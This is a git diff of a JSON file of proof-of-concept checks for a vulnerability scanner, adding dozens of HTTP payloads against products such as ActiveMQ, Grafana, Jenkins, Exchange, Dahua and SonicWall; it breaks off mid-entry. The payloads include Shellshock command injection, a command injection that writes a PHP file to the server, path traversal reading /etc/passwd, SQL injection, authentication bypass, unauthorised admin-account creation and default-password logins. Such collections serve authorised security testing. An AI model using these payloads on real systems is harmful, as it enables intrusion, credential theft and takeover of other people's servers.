@@ -1,17 +1,2445 @@
 {
   "PocName": {
-    "Shiro_default_key": {
-      "description": "Shiro默认key",
+    "activemq默认账号密码": {
+      "description": "activemq默认账号密码admin/admin",
+      "payload": {
+        "method": "GET",
+        "uri": "/admin/",
+        "headers": {
+          "Authorization": "Basic YWRtaW46YWRtaW4="
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Welcome to the Apache ActiveMQ Console of"
+    },
+    "airflow-unauth": {
+      "description": "airflow未授权访问",
+      "payload": {
+        "method": "GET",
+        "uri": "/admin/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<h2>DAGs</h2>"
+    },
+    "amtt-hiboss-server-ping-rce": {
+      "description": "安美数字-酒店宽带运营系统-远程命令执行漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/manager/radius/server_ping.php?ip=127.0.0.1|echo%20\"<?php%20echo%20md5(12123);unlink(__FILE__);?>\">../../12123.php&id=1",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "parent.doTestResult"
+    },
+    "bash-cve-2014-6271": {
+      "description": "bash-cve-2014-6271",
       "payload": {
         "method": "GET",
         "uri": "/",
         "headers": {
-          "Cookie": "rememberMe=test"
+          "User-Agent": " () { :; }; echo; echo; /bin/bash -c 'expr 800111100 + 1001001111'"
         },
-        "body": {}
+        "body": ""
       },
-      "location": "headers",
+      "location": "body",
+      "keywords": "1801112211"
+    },
+    "cisco-cve-2020-3452-readfile": {
+      "description": "cisco-cve-2020-3452-readfile",
+      "payload": {
+        "method": "GET",
+        "uri": "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "INTERNAL_PASSWORD_ENABLED"
+    },
+    "ClickHouse未授权访问": {
+      "description": "ClickHouse数据库未授权访问查询",
+      "payload": {
+        "method": "GET",
+        "uri": "/?query=SHOW%20tables%20from%20system",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "zeros_mt"
+    },
+    "C-Lodop云平台云打印任意文件读取": {
+      "description": "C-Lodop云平台任意文件读取漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "D-Link_DCS_信息泄露": {
+      "description": "D-Link_DCS_信息泄露,泄露md5账号密码",
+      "payload": {
+        "method": "GET",
+        "uri": "/config/getuser?index=0",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "pass="
+    },
+    "dahua-cve-2021-33044-authentication-bypass": {
+      "description": "dahua-cve-2021-33044-authentication-bypass",
+      "payload": {
+        "method": "POST",
+        "uri": "/RPC2_Login",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "{\"id\": 1, \"method\": \"global.login\", \"params\": {\"authorityType\": \"Default\", \"clientType\": \"NetKeyboard\", \"loginType\": \"Direct\", \"password\": \"Not Used\", \"passwordType\": \"Default\", \"userName\": \"admin\"}, \"session\": 0}"
+      },
+      "location": "body",
+      "keywords": "{\"id\":1,\"params\":{\"keepAliveInterval\":60},\"result\":true,\"session\":\""
+    },
+    "datang-ac-default-password-cnvd-2021-04128": {
+      "description": "大唐电信ac默认密码",
+      "payload": {
+        "method": "POST",
+        "uri": "/login.cgi",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95"
+      },
+      "location": "body",
+      "keywords": "window\\.open\\('index\\.htm\\?_"
+    },
+    "docker-api-unauthorized-rce.yml": {
+      "description": "docker-api-unauthorized-rce.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/info",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "RegistryConfig"
+    },
+    "docker-registry-api-unauth": {
+      "description": "docker-registry-api-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/v2/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "docker-distribution-api-version"
+    },
+    "druid-monitor-unauth": {
+      "description": "druid-monitor-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/druid/index.html",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Druid Stat Index"
+    },
+    "elasticsearch-unauth": {
+      "description": "elasticsearch-unauth未授权访问",
+      "payload": {
+        "method": "GET",
+        "uri": "/_cat",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "/_cat/master"
+    },
+    "etouch-v2-sqli": {
+      "description": "etouch-v2-sqli",
+      "payload": {
+        "method": "GET",
+        "uri": "/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "c4ca4238a0b923820dcc509a6f75849b"
+    },
+    "ExchangeServer-Pre-auth-Path-Confusion": {
+      "description": "Microsoft Exchange Server Pre-auth Path Confusion vulnerability (CVE-2021-34473) ",
+      "payload": {
+        "method": "GET",
+        "uri": "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Exchange MAPI/HTTP Connectivity Endpoint"
+    },
+    "flink-jobmanager任意文件读取": {
+      "description": "flink-jobmanager任意文件读取",
+      "payload": {
+        "method": "GET",
+        "uri": "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "glassfish-cve-2017-1000028-lfi": {
+      "description": "glassfish-cve-2017-1000028-lfi",
+      "payload": {
+        "method": "GET",
+        "uri": "/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Ant-Version:"
+    },
+    "go-pprof-leak": {
+      "description": "go-pprof是go语言的调试工具（还存在另一个路径/debug/pprof/goroutine?debug=1）",
+      "payload": {
+        "method": "GET",
+        "uri": "/debug/pprof/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Types of profiles available"
+    },
+    "grafana-default-password": {
+      "description": "grafana-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/login",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "{\"user\":\"admin\",\"password\":\"admin\"}"
+      },
+      "location": "body",
+      "keywords": "\"message\":\"Logged in\""
+    },
+    "Grafana任意文件读取漏洞复现": {
+      "description": "Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件",
+      "payload": {
+        "method": "GET",
+        "uri": "/public/plugins/gauge/../../../../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": " root:x:0:0:"
+    },
+    "h2数据库未授权访问": {
+      "description": "h2数据库未授权访问",
+      "payload": {
+        "method": "GET",
+        "uri": "/h2-console",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Welcome to H2"
+    },
+    "hadoop-yarn-unauth.yml": {
+      "description": "hadoop-yarn-unauth.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/ws/v1/cluster/info",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "resourceManagerVersionBuiltOn"
+    },
+    "Harbor 未授权创建管理员漏洞": {
+      "description": "未授权创建账号",
+      "payload": {
+        "method": "POST",
+        "uri": "/api/users",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "{\"username\":\"chumeng\",\"email\":\"chumeng@qq.com\",\"realname\":\"chumeng\",\"password\":\"chumengchumeng\",\"comment\":\"1\",\"has_admin_role\":true}"
+      },
+      "location": "body",
+      "keywords": "renyizifumofamen"
+    },
+    "ifw8-router-cve-2019-16313": {
+      "description": "ifw8路由器密码泄露",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.htm?PAGE=web",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "www.ifw8.cn"
+    },
+    "influxdb-unauth": {
+      "description": "influxdb-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/ping",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "x-influxdb-version"
+    },
+    "jenkins-cve-2018-1000861-rce.yml": {
+      "description": "jenkins-cve-2018-1000861-rce.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27chumeng%27,%20version=%271%27)%0aimport%20Payload",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "package#chumeng"
+    },
+    "Jetty WEB-INF敏感信息泄露漏": {
+      "description": "Jetty WEB-INF敏感信息泄露漏",
+      "payload": {
+        "method": "GET",
+        "uri": "/.%00/WEB-INF/web.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<web-app>"
+    },
+    "Jira_信息泄露": {
+      "description": " 受影响的 Atlassian Jira 服务器和数据中心版本允许未经身份验证的用户通过 QueryComponentRendererValue!Default.jspa 端点中的信息披露漏洞枚举用户。受影响的版本为 8.5.13 之前的版本、8.13.5 之前的 8.6.0 版本以及 8.15.1 之前的 8.14.0 版本",
+      "payload": {
+        "method": "GET",
+        "uri": "/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "jspa?name=admin"
+    },
+    "kongAPI-cve-2020-11710-unauth": {
+      "description": "kongAPI-cve-2020-11710-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "kong_env"
+    },
+    "kubernetes-unauth": {
+      "description": "kubernetes-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/api/v1/nodes",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "\"kubeletVersion\":"
+    },
+    "landray-oa-custom-jsp-fileread-linux": {
+      "description": "landray-oa-custom-jsp-fileread",
+      "payload": {
+        "method": "POST",
+        "uri": "/sys/ui/extend/varkind/custom.jsp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "landray-oa-custom-jsp-fileread-windows": {
+      "description": "landray-oa-custom-jsp-fileread",
+      "payload": {
+        "method": "POST",
+        "uri": "/sys/ui/extend/varkind/custom.jsp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "var={\"body\":{\"file\":\"file:///c://windows/win.ini\"}}"
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "lanproxy-cve-2021-3019-lfi.yml": {
+      "description": "lanproxy-cve-2021-3019-lfi.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/../conf/config.properties",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "config.admin.username"
+    },
+    "MessageSolution_邮件归档系统EEA_信息泄露漏洞": {
+      "description": " MessageSolution_邮件归档系统EEA_信息泄露漏洞,源码中泄露账号密码",
+      "payload": {
+        "method": "GET",
+        "uri": "/authenticationserverservlet",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "</password>"
+    },
+    "mpsec-isg1000-file-read": {
+      "description": "mpsec-isg1000-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "natshell-arbitrary-file-read": {
+      "description": "natshell-arbitrary-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/download.php?file=../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "node-red-dashboard-file-read-cve-2021-3223": {
+      "description": "node-red-dashboard-file-read-cve-2021-3223",
+      "payload": {
+        "method": "GET",
+        "uri": "/ui_base/js/..%2f..%2f..%2f..%2fsettings.js",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "password"
+    },
+    "novnc-url-redirection-cve-2021-3654": {
+      "description": "novnc-url-redirection-cve-2021-3654",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<title>noVNC</title>"
+    },
+    "nps-default-password": {
+      "description": "nps-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/login/verify",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "username=admin&password=123"
+      },
+      "location": "body",
+      "keywords": "json"
+    },
+    "nuuo-file-inclusion": {
+      "description": "nuuo-file-inclusion",
+      "payload": {
+        "method": "GET",
+        "uri": "/css_parser.php?css=css_parser.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "text/css"
+    },
+    "odoo-file-read": {
+      "description": "odoo-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/base_import/static/etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "panabit-gateway-default-password": {
+      "description": "panabit-gateway-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/login/userverify.cgi",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "username=admin&password=panabit"
+      },
+      "location": "body",
+      "keywords": "URL=/index.htm"
+    },
+    "panabit-ixcache-default-password": {
+      "description": "panabit-ixcache-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/login/userverify.cgi",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "username=admin&password=ixcache"
+      },
+      "location": "body",
+      "keywords": "URL=/cgi-bin/monitor.cgi"
+    },
+    "rabbitmq-default-password": {
+      "description": "rabbitmq-default-password",
+      "payload": {
+        "method": "GET",
+        "uri": "/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "RabbitMQ"
+    },
+    "rockmongo-default-password": {
+      "description": "rockmongo-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/index.php?action=login.index&host=0",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3"
+      },
+      "location": "body",
+      "keywords": "/index.php?action=admin.index&host=0"
+    },
+    "ruoyi-management-fileread-linux": {
+      "description": "ruoyi-management-fileread-linux",
+      "payload": {
+        "method": "GET",
+        "uri": "/common/download/resource?resource=/profile/../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "satellian-cve-2020-7980-rce": {
+      "description": "satellian-cve-2020-7980-rce",
+      "payload": {
+        "method": "POST",
+        "uri": "/cgi-bin/libagent.cgi?type=J",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json",
+          "Cookie": "ctr_t=0; sid=123456789"
+        },
+        "body": "{\"O_\": \"A\", \"F_\": \"EXEC_CMD\", \"S_\": 123456789, \"P1_\": {\"Q\": \"expr 12341213 + 12341213\", \"F\": \"EXEC_CMD\"}, \"V_\": 1}"
+      },
+      "location": "body",
+      "keywords": "24682426"
+    },
+    "showdoc-default-password": {
+      "description": "showdoc-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/server/index.php?s=/api/user/login",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "username=showdoc&password=123456"
+      },
+      "location": "body",
+      "keywords": "groupid"
+    },
+    "skywalking-cve-2020-9483-sqli": {
+      "description": "skywalking-cve-2020-9483-sqli",
+      "payload": {
+        "method": "POST",
+        "uri": "/graphql",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"query\":\"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\"all_p99\",id:\"') UNION SELECT 1,CONCAT('~','chumengchumeng','~')-- \",}, duration: $d){values{value}}}\",\"variables\":{\"d\":{\"start\":\"2022-02-11\",\"end\":\"2021-02-12\",\"step\":\"DAY\"}}}"
+      },
+      "location": "body",
+      "keywords": "chumengchumeng"
+    },
+    "solarwinds-cve-2020-10148": {
+      "description": "solarwinds-cve-2020-10148",
+      "payload": {
+        "method": "GET",
+        "uri": "/web.config.i18n.ashx?l=en-US&v=910204135",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "SolarWinds.Orion.Core.Common"
+    },
+    "sonicwall-ssl-vpn-rce": {
+      "description": "sonicwall-ssl-vpn-rce",
+      "payload": {
+        "method": "GET",
+        "uri": "/cgi-bin/jarrewrite.sh",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "X-Test": "() { :; }; echo ; /bin/bash -c 'expr 98547822 - 374587'"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "98173235"
+    },
+    "spark-api-unauth": {
+      "description": "spark-api-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/v1/submissions",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Missing an action"
+    },
+    "spark-webui-unauth": {
+      "description": "spark-webui-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<strong>URL:</strong> spark:"
+    },
+    "telecom-gateway-default-password": {
+      "description": "telecom-gateway-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/manager/login.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "Name=admin&Pass=admin"
+      },
+      "location": "body",
+      "keywords": "<title>电信网关服务器管理后台</title>"
+    },
+    "tensorboard-unauth": {
+      "description": "tensorboard-unauth",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "The TensorFlow Authors. All Rights Reserved."
+    },
+    "ueditor-cnvd-2017-20077-file-upload.yml": {
+      "description": "ueditor-cnvd-2017-20077-file-upload.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/ueditor/net/controller.ashx?action=catchimage&encode=utf-8",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept-Encoding": "deflate"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "没有指定抓取源"
+    },
+    "uWSGI 目录穿越": {
+      "description": "uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言,uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件",
+      "payload": {
+        "method": "GET",
+        "uri": "/..%2f..%2f..%2f..%2f..%2fetc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "vmware-vcenter-arbitrary-windows": {
+      "description": "vmware-vcenter-arbitrary",
+      "payload": {
+        "method": "GET",
